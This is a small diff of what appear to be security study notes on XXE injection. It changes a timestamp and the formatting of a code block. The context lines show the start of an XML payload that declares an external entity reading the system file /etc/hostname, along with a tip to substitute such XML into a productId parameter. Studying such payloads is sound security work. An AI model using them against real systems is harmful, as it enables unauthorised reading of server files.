@@ -1,7 +1,7 @@
 ---
 publish: true
 created: 2026-06-26T15:28:35.561+05:30
-modified: 2026-08-05T16:35:41.493+05:30
+modified: 2026-08-05T18:11:13.855+05:30
 ---
 
 # Introduction
@@ -61,7 +61,7 @@ if you find `productId=1`, modify to `productId=<ALL_XML_ABOVE>`.
 
 XML-Based formats : DOCX, SVG.
 
-```xml
+```xml showLineNumbers{3} title="xml.xml"
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE test [ 
 <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
